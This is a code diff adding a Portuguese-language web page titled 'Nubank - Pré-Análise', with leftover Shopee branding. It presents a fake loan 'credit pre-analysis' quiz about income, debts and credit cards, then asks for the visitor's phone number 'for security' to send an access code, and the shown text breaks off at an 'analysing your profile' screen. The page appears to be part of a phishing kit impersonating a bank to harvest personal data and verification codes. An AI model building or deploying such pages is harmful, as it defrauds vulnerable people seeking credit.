@@ -1,0 +1,1006 @@
+<html lang="pt-BR"><head>
+    <style>
+        .text-white {
+            color: white !important;
+        }
+    </style>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Nubank - Pré-Análise</title>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <link href="css2-1" rel="stylesheet">
+    
+    <script src="/02/S5daqZ1hgcJq.js"></script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        shopee: {
+                            light: "#cab600",
+                            DEFAULT: "#9903d6",
+                            dark: "#9903d6",
+                        },
+                    },
+                },
+            },
+        };
+    </script>
+    
+    <style>
+        body {
+            font-family: "Poppins", sans-serif;
+            background-color: #f6f6f6;
+        }
+
+        .shopee-gradient {
+            background: linear-gradient(135deg, #ffd900 0%, #cab600 100%);
+        }
+
+        .card {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+            border-radius: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right,
+                    rgba(255, 255, 255, 0) 0%,
+                    rgba(255, 255, 255, 0.3) 50%,
+                    rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+                opacity: 0;
+            }
+
+            10% {
+                left: 100%;
+                opacity: 0.6;
+            }
+
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        .floating {
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translateY(0px);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+
+            100% {
+                transform: translateY(0px);
+            }
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background-color: #e5e7eb;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            border-radius: 4px;
+            background: linear-gradient(90deg, #9903d6 0%, #7a02ad 100%);
+            transition: width 0.5s ease;
+        }
+
+        .quiz-option {
+            border: 2px solid #e5e7eb;
+            transition: all 0.3s ease;
+        }
+
+        .quiz-option:hover {
+            border-color: #9903d6;
+            background-color: rgba(153, 3, 214, 0.336);
+            /* mesmo “peso” do alpha */
+        }
+
+        .quiz-option.selected {
+            border-color: #9903d6;
+            background-color: #9903d633;
+            /* alpha 0x33 ≈ 0.2, mesma proporção */
+        }
+
+        .icon-circle {
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        .page-transition {
+            transition: opacity 0.4s ease, transform 0.4s ease;
+        }
+
+        .fade-out {
+            opacity: 0;
+            transform: translateY(20px);
+        }
+
+        .fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.absolute{position:absolute}.relative{position:relative}.sticky{position:sticky}.inset-0{inset:0px}.top-0{top:0px}.z-10{z-index:10}.mx-auto{margin-left:auto;margin-right:auto}.my-4{margin-top:1rem;margin-bottom:1rem}.mb-2{margin-bottom:0.5rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.ml-2{margin-left:0.5rem}.mr-3{margin-right:0.75rem}.mt-1{margin-top:0.25rem}.mt-4{margin-top:1rem}.mt-auto{margin-top:auto}.block{display:block}.flex{display:flex}.inline-flex{display:inline-flex}.hidden{display:none}.h-2{height:0.5rem}.h-3{height:0.75rem}.h-32{height:8rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.min-h-screen{min-height:100vh}.w-0{width:0px}.w-3{width:0.75rem}.w-32{width:8rem}.w-6{width:1.5rem}.w-full{width:100%}.max-w-md{max-width:28rem}.max-w-xs{max-width:20rem}.flex-1{flex:1 1 0%}.flex-shrink-0{flex-shrink:0}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}.cursor-pointer{cursor:pointer}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.space-y-3 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.75rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.75rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.rounded-full{border-radius:9999px}.rounded-xl{border-radius:0.75rem}.border{border-width:1px}.border-2{border-width:2px}.border-4{border-width:4px}.border-b{border-bottom-width:1px}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.border-transparent{border-color:transparent}.border-t-shopee{--tw-border-opacity:1;border-top-color:rgb(153 3 214 / var(--tw-border-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-shopee{--tw-bg-opacity:1;background-color:rgb(153 3 214 / var(--tw-bg-opacity, 1))}.bg-shopee-light{--tw-bg-opacity:1;background-color:rgb(202 182 0 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-opacity-10{--tw-bg-opacity:0.1}.p-4{padding:1rem}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.py-6{padding-top:1.5rem;padding-bottom:1.5rem}.text-left{text-align:left}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-4xl{font-size:2.25rem;line-height:2.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-green-500{--tw-text-opacity:1;color:rgb(34 197 94 / var(--tw-text-opacity, 1))}.text-shopee{--tw-text-opacity:1;color:rgb(153 3 214 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-500{transition-duration:500ms}.ease-out{transition-timing-function:cubic-bezier(0, 0, 0.2, 1)}.hover\:bg-shopee-dark:hover{--tw-bg-opacity:1;background-color:rgb(153 3 214 / var(--tw-bg-opacity, 1))}.focus\:border-transparent:focus{border-color:transparent}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-shopee:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(153 3 214 / var(--tw-ring-opacity, 1))}@media (min-width: 768px){.md\:py-12{padding-top:3rem;padding-bottom:3rem}}</style><style>
+  .imageye-selected {
+    outline: 2px solid black !important;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5) !important;
+  }
+</style></head>
+
+<body class="bg-gray-50">
+    <div id="quizPage" class="max-w-md mx-auto min-h-screen flex flex-col relative  page-transition">
+        <!-- Header com voltar -->
+        <div class="flex flex-wrap items-center justify-between p-4 border-b  shadow-sm sticky top-0 z-10" style="background-color: white;">
+            <div class="flex items-center">
+                <button id="btnVoltar" class="text-shopee text-2xl mr-3">
+                    <i class="fas fa-arrow-left" style="color:9903d6"></i>
+                </button>
+                <div class="flex items-center">
+                    <img src="/02/etj7ONPx27hI.png" alt="Shopee Logo" class="h-8">
+                    <span class="ml-2 text-xl font-bold text-shopee"></span>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Conteúdo do Quiz -->
+        <div class="flex-1 p-6 flex flex-col">
+            <!-- Progresso do Quiz -->
+            <div class="mb-6">
+                <div class="flex justify-between mb-2">
+                    <span class="text-sm text-gray-600">Pré-análise de crédito</span>
+                    <span id="progressText" class="text-sm font-semibold text-shopee">2/8</span>
+                </div>
+                <div class="progress-container">
+                    <div id="progressBar" class="progress-bar" style="width: 25%;"></div>
+                </div>
+            </div>
+
+            <!-- Container de perguntas do Quiz -->
+            <div id="quizContainer" class="flex-1">
+                <!-- Pergunta 1 -->
+                <div id="question1" class="quiz-question">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Qual o valor aproximado que você deseja solicitar?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Escolha a faixa de valor mais adequada à sua necessidade.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer selected" data-value="500-1000" data-question="1">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">R$500 – R$1.000</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="1001-3000" data-question="1">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">R$1.001 – R$3.000</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="3001-5000" data-question="1">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">R$3.001 – R$5.000</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="acima5000" data-question="1">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Acima de R$5.000</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 2 (oculta inicialmente) -->
+                <div id="question2" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Possui renda fixa atualmente?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Esta informação nos ajuda a calcular o valor de crédito ideal para
+                        você.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="carteira-assinada" data-question="2">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">
+                                        Sim, carteira assinada
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="autonomo" data-question="2">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Sim, autônomo</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sem-renda" data-question="2">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">
+                                        Não tenho renda fixa
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 3 (oculta inicialmente) -->
+                <div id="question3" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Seu nome está negativado atualmente?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Esta informação nos ajuda a avaliar seu perfil de crédito.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="3">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Sim</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="3">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Não</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao-sei" data-question="3">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Não sei</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 4 (oculta inicialmente) -->
+                <div id="question4" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Já tentou solicitar algum tipo de crédito online nos últimos 6
+                        meses?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Esta informação é necessária para avaliarmos o seu perfil de
+                        crédito.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="aprovado" data-question="4">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Sim, fui aprovado</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="negado" data-question="4">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Sim, fui negado</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="4">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Não</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 5 (Vencimento do empréstimo) -->
+                <div id="question5" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Qual o melhor dia pra vencimento do seu empréstimo?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Escolha a data que melhor se adequa ao seu planejamento financeiro
+                        mensal.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="10" data-question="5">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Dia 10</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="15" data-question="5">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Dia 15</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="20" data-question="5">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Dia 20</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="25" data-question="5">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Dia 25</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 6 (Finalidade do crédito) -->
+                <div id="question6" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Pra qual finalidade você precisa desse crédito?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Esta informação nos ajuda a personalizar sua oferta de acordo com
+                        suas necessidades.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="pagar-contas" data-question="6">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Pagar contas</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="investir-negocio" data-question="6">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">
+                                        Investir no próprio negócio
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="comprar-algo" data-question="6">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">
+                                        Comprar algo importante
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="uso-pessoal" data-question="6">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Uso pessoal</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 7 (Cartão de Crédito) -->
+                <div id="question7" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Você já possui cartão de crédito ativo?
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Esta informação nos ajuda a personalizar a melhor oferta para seu
+                        perfil.
+                    </p>
+
+                    <div class="space-y-3 mb-6">
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="sim" data-question="7">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Sim</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="quiz-option p-4 rounded-xl cursor-pointer" data-value="nao" data-question="7">
+                            <div class="flex items-center">
+                                <div class="w-6 h-6 border-2 border-gray-300 rounded-full mr-3 flex-shrink-0 flex items-center justify-center">
+                                    <div class="option-selected hidden w-3 h-3 bg-shopee rounded-full"></div>
+                                </div>
+                                <div>
+                                    <p class="font-medium text-gray-800">Não</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Pergunta 8 (telefone) -->
+                <div id="question8" class="quiz-question hidden">
+                    <h2 class="text-xl font-bold text-gray-800 mb-4">
+                        Por medidas de segurança, informe seu telefone
+                    </h2>
+                    <p class="text-gray-600 mb-6">
+                        Utilizaremos para confirmar seus dados e enviar o código de
+                        acesso.
+                    </p>
+
+                    <div class="mb-6">
+                        <label for="telefoneInput" class="block text-gray-700 font-medium mb-2">Número de
+                            Telefone:</label>
+                        <input type="tel" id="telefoneInput" placeholder="(00) 00000-0000" class="w-full border border-gray-300 rounded-xl p-4 focus:outline-none focus:ring-2 focus:ring-shopee focus:border-transparent">
+                        <p class="text-sm text-gray-500 mt-1">
+                            Digite seu número com DDD
+                        </p>
+                    </div>
+
+                    <button id="btnConfirmarTelefone" class="w-full bg-shopee hover:bg-shopee-dark text-white font-bold py-4 rounded-xl mb-4">
+                        Confirmar telefone
+                    </button>
+                </div>
+
+                <!-- Tela de análise (oculta inicialmente) -->
+                <div id="analysisScreen" class="quiz-question hidden">
+                    <div class="text-center py-6 md:py-12">
+                        <div class="relative w-32 h-32 mx-auto mb-8">
+                            <div class="absolute inset-0 rounded-full border-4 border-gray-200"></div>
+                            <div class="absolute inset-0 rounded-full border-4 border-transparent border-t-shopee animate-spin">
+                            </div>
+                            <div class="absolute inset-0 flex items-center justify-center">
+                                <i class="fas fa-shield-alt text-shopee text-3xl"></i>
+                            </div>
+                        </div>
+
+                        <h2 class="text-2xl font-bold text-gray-800 mb-6">
+                            Analisando seu perfil
+                        </h2>
+
+                        <div class="max-w-xs mx-auto bg-white rounded-xl shadow-sm p-4 mb-6">
